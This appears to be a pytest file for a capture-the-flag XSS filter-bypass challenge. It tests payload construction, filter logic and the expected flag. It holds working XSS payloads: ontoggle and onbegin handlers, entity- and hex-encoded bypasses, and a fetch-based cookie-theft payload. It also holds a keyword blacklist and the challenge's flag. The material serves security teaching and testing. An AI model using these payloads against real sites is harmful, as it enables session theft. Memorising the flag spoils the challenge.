"""
Tests for XSS Filter Bypass challenge.
Tests payload construction and filter bypass logic.
"""
import pytest
import re


class TestXSSPayloads:
    """Tests for XSS payload construction."""

    def test_ontoggle_payload(self):
        """Test ontoggle event handler payload."""
        payload = "<details open ontoggle=&#97;lert(1)>"

        # Should use details element
        assert "<details" in payload.lower()

        # Should use ontoggle event (not onerror, onclick, etc.)
        assert "ontoggle" in payload.lower()

        # Should be auto-triggering with 'open'
        assert "open" in payload.lower()

    def test_svg_animate_payload(self):
        """Test SVG animate payload."""
        payload = "<svg><animate onbegin=&#97;lert(1) attributeName=x>"

        # Should use SVG element
        assert "<svg" in payload.lower()

        # Should use animate element
        assert "animate" in payload.lower()

        # Should use onbegin event
        assert "onbegin" in payload.lower()

    def test_html_entity_encoding(self):
        """Test HTML entity encoding for 'alert'."""
        payload = "&#97;lert(1)"

        # &#97; is 'a'
        # This bypasses simple 'alert' string detection
        assert "alert" not in payload or "&#97;" in payload


class TestXSSFilterBypass:
    """Tests for XSS filter bypass techniques."""

    def test_blacklist_bypass_ontoggle(self):
        """Test that ontoggle bypasses common blacklists."""
        common_blacklist = ["onclick", "onerror", "onload", "onmouseover", "onfocus"]

        payload = "<details open ontoggle=alert(1)>"

        for blocked in common_blacklist:
            assert blocked not in payload.lower()

    def test_blacklist_bypass_svg(self):
        """Test SVG-based bypasses."""
        payload = "<svg><animate onbegin=alert(1)>"

        # Should not contain commonly blocked event handlers
        blocked_patterns = ["onclick", "onerror", "onload"]
        for pattern in blocked_patterns:
            assert pattern not in payload.lower()

    def test_document_cookie_bypass(self):
        """Test hex encoding bypass for document.cookie."""
        # Original: document.cookie
        # Bypass: self['\x64ocument']['\x63ookie']
        # \x64 = 'd', \x63 = 'c'

        encoded = "\\x64ocument"
        assert "document" not in encoded
        assert "d" in bytes(encoded, "utf-8").decode("unicode_escape")


class TestXSSCookieTheft:
    """Tests for cookie theft payload construction."""

    def test_cookie_theft_payload_structure(self):
        """Test that cookie theft payload has correct structure."""
        payload = '''<details open ontoggle="fetch('/receive',{method:'POST',body:JSON.stringify({cookie:self['\\x64ocument']['\\x63ookie']})})">'''

        # Should use fetch API
        assert "fetch" in payload

        # Should use POST method
        assert "POST" in payload

        # Should bypass 'document' filter
        assert "\\x64ocument" in payload

        # Should bypass 'cookie' filter
        assert "\\x63ookie" in payload

    def test_hex_encoding_decodes_correctly(self):
        """Test that hex encoding decodes to expected values."""
        # \x64 = 100 = 'd'
        assert chr(0x64) == 'd'
        # \x63 = 99 = 'c'
        assert chr(0x63) == 'c'


class TestXSSFilterLogic:
    """Tests for XSS filter logic simulation."""

    SAMPLE_BLACKLIST = [
        "script", "onclick", "onerror", "onload",
        "alert", "document.cookie", "eval",
        "onmouseover", "onfocus"
    ]

    def sample_filter(self, payload):
        """Simulate the vulnerable app's XSS filter."""
        payload_lower = payload.lower()
        for blocked in self.SAMPLE_BLACKLIST:
            if blocked in payload_lower:
                return False  # Blocked
        return True  # Passed

    def test_ontoggle_passes_filter(self):
        """Test that ontoggle payload passes the filter."""
        payload = "<details open ontoggle=&#97;lert(1)>"
        assert self.sample_filter(payload)

    def test_onclick_blocked(self):
        """Test that onclick is blocked by filter."""
        payload = "<div onclick=alert(1)>click</div>"
        assert not self.sample_filter(payload)

    def test_script_tag_blocked(self):
        """Test that script tag is blocked."""
        payload = "<script>alert(1)</script>"
        assert not self.sample_filter(payload)


class TestXSSPayloadVariations:
    """Tests for various XSS payload variations."""

    def test_case_insensitive_event_handlers(self):
        """Test mixed case event handlers."""
        # Some filters only check lowercase
        variations = [
            "ONCLICK",
            "OnClick",
            "onClick",
        ]
        # All should be valid HTML event handlers
        for var in variations:
            assert var.lower() == "onclick"

    def test_encoded_payloads(self):
        """Test various encoding techniques."""
        payloads = [
            "&#97;lert(1)",  # HTML entity for 'a'
            "al&#101;rt(1)",  # HTML entity for 'e'
            "alert&#40;1&#41;",  # HTML entities for parentheses
        ]

        # All should decode to valid JavaScript
        for payload in payloads:
            # Just verify they contain encoded characters
            assert "&#" in payload


class TestXSSFlag:
    """Tests for expected flag format."""

    def test_flag_format(self):
        """Test that expected flag matches CTF format."""
        expected_flag = "CTF{xss_f1lt3r_byp4ss3d_l1k3_4_pr0}"

        assert expected_flag.startswith("CTF{")
        assert expected_flag.endswith("}")
        assert "xss" in expected_flag.lower()
        # Note: uses leetspeak "byp4ss3d" instead of "bypassed"
        assert "byp4ss" in expected_flag.lower() or "bypass" in expected_flag.lower()


class TestXSSPayloadValidation:
    """Tests for XSS payload structural validation."""

    def test_payload_has_closing_bracket(self):
        """Test that payloads are well-formed HTML."""
        payloads = [
            "<details open ontoggle=alert(1)>",
            "<svg><animate onbegin=alert(1) attributeName=x>",
        ]

        for payload in payloads:
            # Should have closing > bracket
            assert payload.endswith(">")

    def test_event_handler_has_value(self):
        """Test that event handlers have JavaScript values."""
        payloads = [
            ("<details open ontoggle=alert(1)>", "ontoggle"),
            ("<svg onbegin=alert(1)>", "onbegin"),
        ]

        for payload, event in payloads:
            # Event handler should have = and a value
            pattern = rf'{event}\s*=\s*\S+'
            assert re.search(pattern, payload, re.IGNORECASE)
